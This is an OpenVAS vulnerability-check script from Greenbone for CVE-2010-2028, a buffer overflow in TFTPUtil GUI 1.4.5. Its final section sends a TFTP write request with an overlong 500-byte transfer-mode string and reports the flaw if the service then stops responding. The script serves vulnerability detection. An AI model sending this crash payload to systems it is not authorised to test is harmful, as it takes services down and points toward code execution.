###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_TFTPUtil_GUI_39872.nasl 14 2013-10-27 12:33:37Z jan $
#
# TFTPUtil GUI Long Transport Mode Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "TFTPUtil GUI is prone to a buffer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code within
the context of the affected application. Failed exploit attempts will
result in a denial-of-service condition.

TFTPUtil GUI 1.4.5 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100618);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-05-04 12:32:13 +0200 (Tue, 04 May 2010)");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_cve_id("CVE-2010-2028");
 script_bugtraq_id(39872);

 script_name("TFTPUtil GUI Long Transport Mode Buffer Overflow Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39872");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/tftputil");

 script_tag(name:"risk_factor", value:"Critical");
 script_description(desc);
 script_summary("Determine if TFTPUtil GUI is prone to a buffer-overflow vulnerability");
 script_category(ACT_DENIAL);
 script_family("Buffer overflow");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies('tftpd_detect.nasl');
 script_require_keys("Services/udp/tftp");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("tftp.inc");

if(safe_checks())exit(0);

port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
if(!get_udp_port_state(port))exit(0);

if(!tftp_alive(port:port))exit(0);

fn = "A";
md = crap(data:"A", length:500);
stuff = raw_string(0x00,0x02) + fn + raw_string(0x00) + md + raw_string(0x00);

soc = open_sock_udp(port);
if(!soc)exit(0);

send(socket:soc, data:stuff);

if(!tftp_alive(port:port)) {
  security_hole(port:port,proto:udp);
  exit(0);
}  

exit(0);
